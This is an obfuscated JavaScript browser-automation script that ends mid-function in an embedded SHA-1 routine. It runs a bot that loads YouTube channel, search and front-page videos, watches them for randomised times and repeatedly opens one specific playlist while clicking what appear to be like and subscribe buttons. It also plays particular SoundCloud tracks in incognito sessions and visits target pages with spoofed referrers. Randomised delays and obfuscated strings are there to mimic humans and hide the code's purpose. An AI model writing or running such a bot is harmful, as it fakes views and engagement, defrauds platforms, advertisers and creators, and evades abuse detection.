const X = d,
  W = b,
  U = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1999 + -0x1b6d + -0xf * -0x389))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1fb * 0xd + 0xb5 * 0x16 + 0x1 * 0xa31), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9b2c + 0x311e * -0x1 + 0xb22 + (0x3 * 0x66e + 0x6e74 + -0x2393 * 0x2) * random()) : await standardWaitForNetIdle(f), await wait(-0x12a * 0x1b + -0x1 * 0x1c23 + 0x4f19 + (0x172a + -0x92b + 0x1911) * random()), -0x61b * 0x2 + -0x1020 + -0x1 * -0x1c57;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * 0x1c8a + 0x1 * -0x97a + 0x398c), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x2c6 * 0x6 + 0x1 * -0x1eed + 0x1 * 0x2f92;
}
async function randomWait() {
  return await wait(-0x3ae * -0xa + -0x2 * -0x12f5 + -0x1 * 0x372e + (0xc55 + 0x210c + -0x19d9) * random()), -0x28 + -0x1 * -0xaa5 + 0x16 * -0x7a;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xa3d + -0x53 * 0x58 + -0x7 * -0x29d, -0x2 * 0xc47 + 0x2b1 + 0x3a6 * 0x6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1b5 * 0xd6 + 0x1505 * 0x13 + 0xc84f) * getRandomInt(0x42 * -0xb + -0xc97 + 0xf6f, 0x1 * -0x21cf + -0x4 * -0x209 + 0x19b0), h)), 0x11b * -0x1a + -0x1 * 0x26ad + 0x436c;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1ccf + -0x18f0 + 0x35bf;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x6ab * -0x1 + 0x11c * -0x22 + 0x1f0e]['split']('\x20');
    for (let k = -0x35c * -0x2 + 0xa99 * -0x1 + 0x3e1; k < i['length']; k += -0x742 * 0x4 + 0x1 * 0x1ea3 + 0x1 * -0x199)
      j += i[k] * h[i[k + (0xc5f * -0x2 + 0x1 * 0x17ef + -0x34 * -0x4)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x5ec + -0x1 * 0x1323 + 0x1 * 0x1915)['map'](l => Array['from'](l['children']))['flat'](-0x1a2 * -0x3 + -0x871 * -0x3 + -0x1e38)['map'](l => l['childNodes'][-0x1a1c + -0x278 * 0xb + -0x1 * -0x3545]['childNodes'][0x16b0 + 0x1 * -0x107 + -0x15a9]['childNodes'][-0x1c87 + -0x8b * -0x34 + 0x1 * 0x4c]['childNodes'][-0x157f + 0x1 * 0x189f + -0x320]['childNodes'][0x22b0 + -0x26cc + 0x41d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * 0x144f + -0x595 * -0x1 + 0x86 * -0x2a, -0x522 + -0x2488 + 0x3d32)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x1bfd * -0x4 + -0x71cb + 0x3c6f);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1f * -0xefd + 0xf1f4 + 0xd * -0x2453) * getRandomInt(0x65a * -0x1 + -0x12be + 0x191a, -0x1 * -0x193 + 0x3b8 * -0x8 + 0x1c32), h);
  return await wait(i), 0x137 * -0xc + 0x137b + 0x72 * -0xb;
}
async function frontScreenActions(f) {
  const R = c;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + R(0x1)), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xbb * -0x1f + -0x842 + -0xe63]['children'][0x749 + 0x1ceb + 0x1 * -0x2434]['children'][0x1a0c + 0x15c4 + 0x48 * -0xaa]['children'][-0x11bf + -0x434 * 0x9 + 0x3793]['children'][0xef * 0x1f + -0x109d + -0xc54]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0xf08 + 0x25bc + -0x16b3;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xe10 + 0x17fb + -0x987 + (0x1998 + 0x75 * 0x4f + -0xeb * 0x43) * random()
  }), await wait(0x2521 + 0x97b + -0x595 * 0x8 + (-0x1f2 + 0xbef + -0x8d1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x11d9 + -0x2499 + -0x5 * -0xae4]['childNodes'][-0x1791 + -0x104c * 0x2 + -0x382a * -0x1]['childNodes'][-0x1b * 0x89 + -0x1520 + 0x2394]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1 * -0xa57 + 0x81 * -0x4c + 0x30a8]['childNodes'][0x216b + 0x53c * -0x1 + 0x27 * -0xb9]['childNodes'][0x21 * 0x9f + 0xcc * -0x2d + 0xf5f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x2578 + 0x1197 + 0x5 * 0x3fa),
          r = 0x26b3 + 0x1ec7 + -0x457a;
        for (let u = 0xe3 * 0x3 + -0xb10 + -0x867 * -0x1; u < q['length']; u += -0x3d * 0x9f + 0x43 * -0x5f + 0x1f61 * 0x2)
          r += q[u] * k[q[u + (0x2181 + -0x2 * 0x28f + -0x1c62)]];
        return r;
      }(n);
  });
  await wait((0x47e7 + 0x1 * -0x47bb + 0x2 * 0x1d36) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x2f03 + 0x1f * -0x6d2 + 0x1d5 * 0x10d) * getRandomInt(-0x2d4 + 0x1 * 0x1b8 + 0x1 * 0x11d, 0x763 + -0x1126 + 0x9cd), h + (-0x26b0 * 0x1 + -0x2417 + 0x5e4f));
  return await wait(i), -0x40 * -0x44 + -0xb * 0x13d + -0x360;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x72f * 0x3 + 0x1 * 0xaa9 + 0xae4), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x41a * -0x1 + -0x1 * 0xd2b + 0x1cfd + (-0x2333 * 0x1 + 0xa27 + -0x1cf4 * -0x1) * Math['random']());
    });
  }, 0x15 * 0x15b + 0x10c * -0x8 + 0x741);
  await wait(0x1b4 * 0x34d + 0x78cf3 + 0x89837 * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x36f * -0x71 + 0xf1c * -0x1 + -0x8a83) * getRandomInt(0x2 * 0xc0 + -0x1 * 0xb6f + 0x9f3, -0x1122 + 0x1271 * 0x1 + -0x136 * 0x1)), clearInterval(h), -0x17 * 0x4f + 0x243 + -0x3 * -0x19d;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1 * 0x18b + -0x570 + 0x1 * 0x3e5;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x12c5 + -0x7 * 0x2d4 + 0x2 * 0x1349;
    await randomWait();
  }
  return 0x44f * 0x1 + -0x1 * 0xd61 + 0x913 * 0x1;
}

function fetchRandomSC() {
  return Math['random']() <= 0x4 * 0x63b + -0x2 * -0x595 + -0x12a * 0x1f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x3cb * 0x1 + -0x5ea * 0x5 + 0x19c7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1862 + 0x1947 + -0x31a9 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xd66 + -0x2295 + 0x2ffb;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x267e + 0xc32b + -0x39e1 + getRandomInt(0x6692 + 0xd * 0x2ab + -0x4ea9 * 0x1, -0xbc2 + 0xac4e + -0x2b5c));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1204 * -0x1 + 0x25ee + -0x6a3 * 0x3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x73 * -0x25 + -0x1c * -0x74 + 0x3ef * 0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1e86 + -0x367 * -0xb + -0x1f1 * 0x23, -0x21b9 + -0x79 * -0x3f + -0x2 * -0x212)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xd * 0xdd + -0x526 + -0x1 * -0x1bd + floor((0x20e9 + -0x22d8 + 0x5d7) * random()))), log('p2'), log(await s['evaluate'](() => {
        const T = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x21fb * 0x4237e + -0xad6d155e + 0xa0cb0ad4),
          0x164 * 0xa08a + -0xc67b * 0x3c + 0x55 * -0x92c4,
          0x9c61 + -0x1 * -0x579a + -0x73fb,
          0xbaf * 0x3 + 0x50e + -0x279b
        ], y = [
          -0x6 * -0x43f + -0x135 * -0x18 + -0x365a,
          -0x1f * -0x7d + -0x1942 + 0x4f * 0x21,
          -0x977 + -0xc1 * 0x14 + 0x1893,
          0x6dd * 0x2 + -0x1 * 0x757 + -0x663
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x61 * 0x11 + 0x119f + -0x180f)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1a76 + 0x1 * -0x1b15 + 0x358b * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xc9 * 0x1f + -0x20e5 + 0x393c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const S = b;
              J ? (A[0xd * -0x2c3 + 0x1687 + 0x2 * 0x6b0] = A[-0x21c8 + -0x1 * 0x121d + 0x33f5] = A[0x7 * 0x28 + -0x4 * -0x1d3 + -0x863] = A[-0xf * -0x55 + 0x1ff * 0xb + 0x1aee * -0x1] = A[0x6 * 0x624 + -0x2377 + -0x15e] = A[-0x841 * -0x4 + 0x1a47 + -0x1 * 0x3b47] = A[0x1 * -0x1277 + 0xf03 * 0x1 + 0x379] = A[-0x1e0a + -0x9a4 + 0x27b4] = A[0x2169 + -0x1170 + -0xff2] = A[0x491 * 0x3 + -0x4b7 * 0x3 + 0x7a] = A[0x1d0f + -0x19d * -0x5 + -0x5 * 0x76b] = A[0x2664 + -0x1cb1 + 0x9a9 * -0x1] = A[0x750 + 0x7a * 0x2 + -0x839] = A[-0x1 * -0x1ce9 + -0x100e + -0xccf] = A[-0x1e61 + -0x46b * -0x6 + 0xfb * 0x4] = A[0x274 + 0x15b + 0x1 * -0x3c1] = A[0xbb * -0x5 + -0x9 * 0x7a + 0x800] = -0x5c * -0x3 + -0x1bd2 + -0xa3 * -0x2a, this['blocks'] = A) : this[S(0x1c, 'Y9R@')] = [
                -0x1704 * -0x1 + 0x15b7 + 0x411 * -0xb,
                -0x22f0 + -0x122 * -0x15 + 0xb26,
                0x205 + 0x6e * 0xa + -0x651,
                -0x2447 * -0x1 + 0x3b3 + -0x27fa * 0x1,
                -0x18af + 0x2 * 0x85 + -0x17a5 * -0x1,
                -0x8fa + -0x129a * 0x2 + 0x2e2e,
                0xcf2 * 0x1 + 0x251 * 0x6 + -0x8 * 0x35b,
                -0x3 * -0x839 + -0x14a2 + -0x1 * 0x409,
                0x1a57 * 0x1 + 0x1a03 * -0x1 + -0x54,
                0x599 * 0x2 + 0x61 * 0xa + 0xefc * -0x1,
                0xe5a + -0x1b66 + -0x2 * -0x686,
                -0x321 + -0x1 * 0x116f + 0x4 * 0x524,
                0x1d41 + -0xa03 + -0x133e,
                -0x2 * -0x359 + 0x70a + 0xdbc * -0x1,
                0x1 * -0x11d8 + -0x1 * 0x1743 + -0x1 * -0x291b,
                0x102d * 0x2 + -0xbc0 + -0x149a,
                -0x255a + -0x1fb2 + 0x450c
              ], this['h0'] = 0x5fe7311c + -0xb0f0f73 * -0x6 + -0x3afc6acd, this['h1'] = 0x973f99f8 * -0x1 + -0x3d3f7 * -0x276b + 0x78148622 * 0x2, this['h2'] = 0xe2908ea9 + 0xbe08c6bd + -0x107de7868, this['h3'] = -0x124 * -0xce4ad + -0x1bfa9e1c + 0x1ad8ee * 0x119, this['h4'] = -0x1009a55dc + 0xfdbb3aed + 0xc6b1fcdf, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x650 * 0x2 + -0x28 * 0xac + 0x2780, this['finalized'] = this['hashed'] = -0x3 * 0x602 + 0x259c + -0x1396, this['first'] = -0xb8f + 0x217c + -0x15ec;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xa3 * -0xb + 0x11be + -0x7 * 0x389, O = J['length'] || 0x2543 + -0xb07 * -0x3 + -0x4658, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xa * 0x1b8 + -0x1e97 + 0xd67, P[0x1ce2 + -0x1796 * 0x1 + -0x54c] = this['block'], P[-0x8 * 0x95 + 0x1c94 + -0x17dc] = P[0x1c8e + -0x323 * 0x4 + -0x1001] = P[-0x782 * -0x3 + 0x36 * 0x76 + -0x2f68] = P[0x2142 + -0xb72 + -0x15cd] = P[-0x16fb + -0xbab + 0x22aa] = P[-0x50d * 0x3 + -0xd0 * -0x5 + 0xb1c] = P[-0x79 * -0xb + -0x128c + 0x15 * 0xa3] = P[0x1baa + -0x1 * 0x1fad + 0x5e * 0xb] = P[0x4cd + 0x48c + -0x2d * 0x35] = P[-0x3 * 0x225 + -0x1d77 * 0x1 + 0x23ef] = P[0x110f + 0x3 * 0xdf + 0x9d1 * -0x2] = P[-0x29d * -0x8 + 0xfe * -0xb + -0x11b * 0x9] = P[0xc5d + -0x1a37 + 0x6 * 0x251] = P[0x829 + 0x844 + -0x1060] = P[-0x1 * -0x19cf + -0x227 * -0x11 + -0x428 * 0xf] = P[0x1 * -0x595 + 0x3 * -0x9a5 + 0x2293] = -0x11f7 + -0xace + 0x1 * 0x1cc5), K) {
                    for (N = this['start']; M < O && N < 0x2296 + 0x957 + -0x2bad; ++M)
                      P[N >> 0x5f0 + -0x53 * -0x56 + -0x21d0] |= J[M] << y[0x1a8f + -0x162d + 0x3 * -0x175 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x197e * 0x1 + -0x24c7 * -0x1 + 0x3e05 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x9 * 0x22a + 0xb97 + -0x1e91 ? P[N >> -0x15a * -0x17 + -0xd1c + 0x11f8 * -0x1] |= L << y[-0xd6 + -0x1 * -0x695 + 0x2de * -0x2 & N++] : L < 0x2 * -0x796 + -0x1cef + -0x1 * -0x341b ? (P[N >> -0xde5 + -0x1e88 + 0x41 * 0xaf] |= (0xac * 0xc + -0x10b6 * 0x1 + -0x1 * -0x966 | L >> -0x429 * 0x8 + 0xb * -0x10f + -0x25 * -0x137) << y[-0x1 * -0xb77 + -0x1caf + 0x191 * 0xb & N++], P[N >> -0x9d7 * -0x2 + 0x1f4f + -0x32fb] |= (-0x1 * -0x1455 + 0x1f2c + -0x3301 | -0x1c4a + 0x1 * -0x1123 + 0xb6b * 0x4 & L) << y[-0x1 * -0xb55 + -0x141b + 0x8c9 & N++]) : L < 0x10062 + 0x20b7 + 0x1 * -0x4919 || L >= 0xb67e + 0xeef + 0x1a93 * 0x1 ? (P[N >> 0x1ea6 * -0x1 + -0x1 * 0x1933 + 0x37db] |= (0x151d * 0x1 + 0x4 * -0x2dc + -0x8cd | L >> -0x26f6 + 0x21ce + 0x25 * 0x24) << y[-0x1d27 + 0xc * 0xc0 + 0x1d * 0xb2 & N++], P[N >> 0x186 + 0xaae * 0x2 + -0x16e0] |= (-0xb * 0x23e + -0x101e * 0x1 + 0x2948 | L >> 0x6 * -0xc6 + 0x62c * 0x1 + -0x182 & -0x1015 + 0x338 * -0x4 + -0x54 * -0x59) << y[0x1 * -0xd06 + 0x2f5 * 0x7 + -0x7aa & N++], P[N >> 0x3 * -0xabe + -0xf5b * 0x1 + 0x2f97] |= (0xb5a + -0x49 * -0x7f + 0x1 * -0x2f11 | -0xe6b + -0x1835 * 0x1 + 0x26df & L) << y[-0x2 * -0x131d + 0x11d7 + -0x380e & N++]) : (L = -0x10e0a + -0x5 * 0x1637 + 0x27d1d + ((-0x13 * 0x4b + 0x6c5 + 0x1 * 0x2cb & L) << -0x143 * 0x5 + 0x1 * 0x19ab + -0x1352 | -0x2198 + -0x2 * 0x7d5 + -0x3541 * -0x1 & J['charCodeAt'](++M)), P[N >> 0xa7 * 0x29 + 0x5 * 0x7bb + -0x4164] |= (-0x1b8c + 0x158f * 0x1 + 0x1 * 0x6ed | L >> 0x226 + 0x8 * -0x19d + 0xad4) << y[-0x1 * -0x1840 + 0x74a + -0x481 * 0x7 & N++], P[N >> 0xd50 + 0x1796 + 0x6 * -0x626] |= (0x1 * -0xf3d + -0x3 * 0x7c4 + 0x2709 | L >> -0x4 * 0x778 + -0x13a5 + -0x1 * -0x3191 & -0x174c + 0x7bd * -0x5 + 0x3e3c) << y[0x2 * -0xab7 + -0x55 * -0x35 + -0x1 * -0x3d8 & N++], P[N >> 0xb * -0x139 + 0x15f9 + 0x442 * -0x2] |= (-0x20e0 + 0x2310 + -0x1b0 | L >> 0x117 * -0x11 + 0x1588 + -0x2fb & 0x2a * -0x41 + -0x1f2 * 0x11 + 0x2bfb) << y[-0x3d * -0x63 + -0x1e57 + 0x6c3 & N++], P[N >> -0x8c * -0x1d + 0x151e + -0x24f8] |= (0x2c3 * 0x7 + 0xbaa * -0x3 + 0x1029 * 0x1 | 0xcee + -0x2033 + 0x1384 & L) << y[-0xa57 + -0x199e + 0x23f8 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xac1 * 0x2 + 0x7 * -0x594 + -0x1 * -0x3cce ? (this['block'] = P[-0x1e37 + 0x215e + -0x317], this['start'] = N - (0xa3 * 0xd + -0x2 * 0x10a5 + 0x1943), this['hash'](), this['hashed'] = 0x360 + 0x7 * -0x459 + 0x1b10 * 0x1) : this['start'] = N;
                }
                return this['bytes'] > 0xf637ded3 + -0xd60c908 + 0x118a8a * 0x152 && (this['hBytes'] += this['bytes'] / (0x1e2f * -0x1e1d4 + -0x169 * 0xff41cc + 0x2a0c31698) << 0x4a * -0x5a + 0x6 * 0xfe + -0x1 * -0x1410, this['bytes'] = this['bytes'] % (-0x980d82c8 + -0x11fecc4 * -0x43 + -0x14cb28b7c * -0x1)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2608 + -0x1244 + -0x1 * 0x13c3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1d9d + -0x265 * -0xe + -0x3f13] = this['block'], J[K >> 0x20cb + 0xb * -0x97 + -0x44 * 0x63] |= x[0xb04 + -0x13ed + 0x8ec & K], this['block'] = J[-0x2 * -0xd43 + -0x5 * -0x73d + -0x3ea7 * 0x1], K >= 0x493 * 0x7 + -0x35b * -0x3 + 0x29de * -0x1 && (this['hashed'] || this['hash'](), J[-0x54e + -0x13ba + 0x1908] = this['block'], J[0x94f * -0x1 + -0x469 * -0x6 + -0x1117] = J[-0x23a8 + 0x185b + 0xb4e] = J[0x1 * 0x169e + -0x1307 * -0x2 + -0x3caa] = J[-0x2087 + -0x235f + 0x43e9] = J[-0x145e + 0x2 * 0x1357 + -0x493 * 0x4] = J[-0x8ef + -0x9c5 + -0x12b9 * -0x1] = J[0xd * 0xb + -0xd2b * -0x1 + -0xdb4] = J[0x158 + 0x38 * -0xa7 + -0x259 * -0xf] = J[-0xcda * -0x1 + -0xac1 * 0x1 + -0x1 * 0x211] = J[-0x1 * -0x568 + -0x1d1e + 0x1 * 0x17bf] = J[0xdde + 0x4 * 0x4e8 + -0x2174] = J[0xece + -0x18f6 + 0x7 * 0x175] = J[-0x2f * 0xb8 + -0x809 + 0x5fb * 0x7] = J[0xf9d + 0x5 * -0x1b3 + -0x25b * 0x3] = J[-0x12da * 0x2 + -0x7ee + -0x158 * -0x22] = J[0x6cc * -0x3 + 0xb8 * 0x20 + -0x1 * 0x28d] = 0x1069 + 0x6 * 0x1c6 + -0x1b0d), J[0x1cd5 + 0x2446 + 0xb7 * -0x5b] = this['hBytes'] << -0x158c + 0x1931 + -0x2 * 0x1d1 | this['bytes'] >>> -0x854 + -0x1cf0 + 0x2561, J[-0x11b6 + -0x2246 + 0x340b] = this['bytes'] << 0x79e + 0x4d5 + -0xc70, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1282 * 0x2 + -0x565 + 0x53 * 0x83; J < -0xe9 * 0x29 + -0x373 + 0x2c * 0xef; ++J)
                K = Q[J - (-0x1389 + -0x12a * 0x2 + 0x15e0)] ^ Q[J - (0x153a + -0x17fe * 0x1 + 0x2cc)] ^ Q[J - (0x3 * 0x403 + -0x2016 + 0x141b * 0x1)] ^ Q[J - (-0x493 * 0x3 + -0x11b * -0x14 + -0x853)], Q[J] = K << -0x763 * -0x4 + 0x74 * 0x4 + 0x17 * -0x15d | K >>> -0xfd4 + -0x1 * 0x1d86 + 0x2d79 * 0x1;
              for (J = 0x1fe6 * -0x1 + -0x12b7 + 0x10df * 0x3; J < -0x1f89 + -0x245d + -0x7 * -0x9b6; J += -0xfe3 + -0x2f * -0x89 + -0x93f)
